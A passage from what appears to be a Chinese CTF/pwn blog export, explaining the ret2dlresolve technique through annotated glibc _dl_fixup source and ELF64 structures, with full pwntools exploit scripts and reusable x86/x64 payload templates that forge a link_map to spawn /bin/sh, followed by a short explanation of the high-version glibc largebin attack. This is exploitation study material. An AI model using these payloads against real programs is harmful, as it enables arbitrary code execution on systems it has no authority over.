0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。</span><br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br>      RTLD_ENABLE_FOREIGN_CALL;<br>	<span class="hljs-comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      <span class="hljs-comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value</span><br>      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123; <br>      <span class="hljs-comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value</span><br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<br>&#125;<br><br><br></code></pre></td></tr></table></figure></div>
+
+<p>因此64位下我们需要控制link_map中l-&gt;addr 和sym中st_value<br>64位下sym的结构体</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf64_Word    st_name;        <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;        <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;       <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf64_Section st_shndx;       <span class="hljs-comment">/* Section index */</span>  <br>  Elf64_Addr    st_value;       <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf64_Xword   st_size;        <span class="hljs-comment">/* Symbol size */</span>  <br>&#125; Elf64_Sym; <br><br></code></pre></td></tr></table></figure></div>
+
+<p>其中</p>
+<ul>
+<li>Elf64_Word 32 位</li>
+<li>Elf64_Section 16 位</li>
+<li>Elf64_Addr 64 位</li>
+<li>Elf64_Xword 64 位</li>
+</ul>
+<p>所以如果将一个函数的got表地址-0x8作为sym的首地址，那么st_value就是got表地址，st_other也不为0</p>
+<p>64位link_map的源码</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> &#123;</span><br>    Elf64_Addr l_addr;<br>    <span class="hljs-type">char</span> *l_name;<br>    Elf64_Dyn *l_ld;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_real</span>;</span><br>    Lmid_t l_ns;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">libname_list</span> *<span class="hljs-title">l_libname</span>;</span><br>    Elf64_Dyn *l_info[<span class="hljs-number">76</span>];  <span class="hljs-comment">//l_info 里面包含的就是动态链接的各个表的信息</span><br>    ...<br>    <span class="hljs-type">size_t</span> l_tls_firstbyte_offset;<br>    <span class="hljs-type">ptrdiff_t</span> l_tls_offset;<br>    <span class="hljs-type">size_t</span> l_tls_modid;<br>    <span class="hljs-type">size_t</span> l_tls_dtor_count;<br>    Elf64_Addr l_relro_addr;<br>    <span class="hljs-type">size_t</span> l_relro_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> l_serial;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auditstate</span> <span class="hljs-title">l_audit</span>[];</span><br>&#125;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>.dynamic对应l_info中的内容</p>
+<p>因此我们伪造link_map表时，首先伪造l_info中的3个指针<br>DT_STRTAB指针，DT_SYMTAB指针，DT_JMPREL指针<br>后面控制l_addr的值</p>
+<p>然后伪造指向的三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为并没有用到</p>
+<p>64位重定位表项与32位不同</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr        r_offset;                <span class="hljs-comment">/* Address */</span><br>  Elf64_Xword        r_info;                        <span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf64_Sxword        r_addend;                <span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>上面几个类型都为64位，因此结构体大小为24字节</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829241/2025/08/deb315a7fb7af8797752bdd0d207def5.png"
+                     
+                ></p>
+<p>另外就是，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0</p>
+<p>接下来我们伪造link_map，know_func_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">4</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">8</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br> <span class="hljs-number">9</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">12</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">13</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">14</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">16</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">17</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">18</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">19</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">20</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">21</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">22</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">23</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">24</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">27</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">28</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">30</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">31</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">32</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">33</span> <br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> pop_rdi_ret = <span class="hljs-number">0x401223</span><br><span class="hljs-number">36</span> pop_rsi_r15_ret = <span class="hljs-number">0x401221</span><br><span class="hljs-number">37</span> ret = <span class="hljs-number">0x4011BE</span><br><span class="hljs-number">38</span> fake_link_map_addr = <span class="hljs-number">0x404050</span><br><span class="hljs-number">39</span> <br><span class="hljs-number">40</span> <br><span class="hljs-number">41</span> fake_link_map=get_fake_link_map(fake_link_map_addr,l_addr,st_value)<br><span class="hljs-number">42</span> <br><span class="hljs-number">43</span> payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>) + p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><span class="hljs-number">44</span> payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr+<span class="hljs-number">0x78</span>) + p64(plt0+<span class="hljs-number">6</span>) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">45</span> payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-number">46</span> <br><span class="hljs-number">47</span> s.sendafter(<span class="hljs-string">&quot;something:\n&quot;</span>,payload)<br><span class="hljs-number">48</span> <br><span class="hljs-number">49</span> s.send(fake_link_map)<br><span class="hljs-number">50</span> <br><span class="hljs-number">51</span> s.interactive()<br></code></pre></td></tr></table></figure></div>
+
+<h3 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h3><p>x86</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>index_offset=base_stage+<span class="hljs-number">20</span>-rel_plt <span class="hljs-comment"># .rel.plt</span><br>fake_sym_addr=base_stage+<span class="hljs-number">28</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span>)<br>fake_sym_addr = fake_sym_addr + align<br>index_dynsym = (fake_sym_addr - dynsym) // <span class="hljs-number">0x10</span><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0x7</span><br>fake_rel_plt = p32(read_got) + p32(r_info)<br>st_name = (fake_sym_addr + <span class="hljs-number">16</span>) - dynstr<br>fake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>)<br>fake_str= <span class="hljs-string">b&quot;system&quot;</span><br><br>payload = <span class="hljs-string">b&#x27;AAAA&#x27;</span>               <span class="hljs-comment"># 4</span><br>payload += p32(plt_0)           <span class="hljs-comment"># 8</span><br>payload += p32(index_offset)    <span class="hljs-comment"># 12</span><br>payload += <span class="hljs-string">b&#x27;aaaa&#x27;</span>              <span class="hljs-comment"># 16</span><br>payload += p32(base_stage + <span class="hljs-number">80</span>) <span class="hljs-comment"># 20 /bin/sh</span><br>payload += fake_rel_plt         <span class="hljs-comment"># 28</span><br>payload += align * <span class="hljs-string">b&quot;B&quot;</span><br>payload += fake_sym<br>payload += fake_str<br>payload += <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(payload))<br>payload += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">200</span> - <span class="hljs-built_in">len</span>(payload))<br></code></pre></td></tr></table></figure></div>
+
+<p>x64</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <span class="hljs-number">3</span> <br> <span class="hljs-number">4</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">6</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">7</span> <br> <span class="hljs-number">8</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">9</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">11</span> <br><span class="hljs-number">12</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">13</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">14</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">16</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">17</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">18</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">19</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">20</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">21</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">22</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">23</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">24</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">27</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">28</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">30</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">31</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">32</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">33</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">36 typedef struct            </span><br><span class="hljs-string">37 &#123;</span><br><span class="hljs-string">38 Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="hljs-string">39 unsigned char    st_info;   /* Symbol type and binding */        </span><br><span class="hljs-string">40 unsigned char st_other;     /* Symbol visibility */              </span><br><span class="hljs-string">41 Elf64_Section    st_shndx;  /* Section index */                  </span><br><span class="hljs-string">42 Elf64_Addr    st_value;     /* Symbol value */                   </span><br><span class="hljs-string">43 Elf64_Xword    st_size;     /* Symbol size */                    </span><br><span class="hljs-string">44 &#125;Elf64_Sym;</span><br><span class="hljs-string">45 </span><br><span class="hljs-string">46 typedef struct           </span><br><span class="hljs-string">47 &#123;</span><br><span class="hljs-string">48 Elf64_Addr    r_offset;         /* Address */                         </span><br><span class="hljs-string">49 Elf64_Xword    r_info;          /* Relocation type and symbol index */</span><br><span class="hljs-string">50 Elf64_Sxword    r_addend;       /* Addend */                          </span><br><span class="hljs-string">51 &#125;Elf64_Rela;</span><br><span class="hljs-string">52 </span><br><span class="hljs-string">53 typedef struct          </span><br><span class="hljs-string">54 &#123;</span><br><span class="hljs-string">55 Elf64_Sxword    d_tag;          /* Dynamic entry type */</span><br><span class="hljs-string">56 union</span><br><span class="hljs-string">57 &#123;</span><br><span class="hljs-string">58 Elf64_Xword d_val;          /* Integer value */</span><br><span class="hljs-string">59 Elf64_Addr d_ptr;           /* Address value */</span><br><span class="hljs-string">60 &#125; d_un;</span><br><span class="hljs-string">61 &#125;Elf64_Dyn;</span><br><span class="hljs-string">62 &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></div>
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://www.cnblogs.com/pwnfeifei/p/15701859.html" >ret2dl_resolve - 狒猩橙 - 博客园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://blog.csdn.net/qq_51868336/article/details/114644569" >ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://zikh26.github.io/posts/ba418f23.html#ret2dl%E5%9B%9E%E9%A1%BE%E6%9E%81%E9%80%9F%E7%89%88" >关于ret2_dl_runtime_resolve的学习总结 | ZIKH26’s Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+      <tags>
+        <tag>stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>高版本largebin_attack</title>
+    <url>/2025/08/05/%E9%AB%98%E7%89%88%E6%9C%AClargebin-attack/</url>
+    <content><![CDATA[<h2 id="利用源码"><a href="#利用源码" class="headerlink" title="利用源码"></a>利用源码</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>      <span class="hljs-keyword">if</span> (fwd != bck) # 检查large bin是否为空<br>        &#123;<br>          <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>          size |= PREV_INUSE;<br>          <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>          assert (chunk_main_arena (bck-&gt;bk));<br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>&lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>            &#123;<br>              fwd = bck;<br>              bck = bck-&gt;bk;<br><br>              victim-&gt;fd_nextsize = fwd-&gt;fd;<br>              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>            &#125;<br>          ...<br>      &#125;<br><br><br></code></pre></td></tr></table></figure></div>
+
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>victim是将要链入largebin的堆块<br>fwd是已经进入large bin中比victim较大的堆块</p>
+<p>如果largin bin中仅有一个堆块<br>fwd-&gt;fd就指向fwd本身</p>
+<p>如果能够控制fwd-&gt;bk_nextsize位target_addr，就能向target_addr + 0x20 的位置写入victim的地址</p>
+<p>这个0x20是因为c语言中访问结构体对象本质是运用偏移，所以-&gt;fd_nextsize相当于+ 0x20</p>
+<p>所有largbin attack流程就是：</p>
+<p>先使一个堆块进入large bin中，修改其bk_nextsize为target_addr</p>
+<p>再使一个比第一个堆块较小的堆块进入large bin即可触发largebin attack</p>
+<p>largebin attack通常作为io利用的前置，用于修改_io_list_all为堆块地址，再进行相关io的伪造和利用</p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+</search>
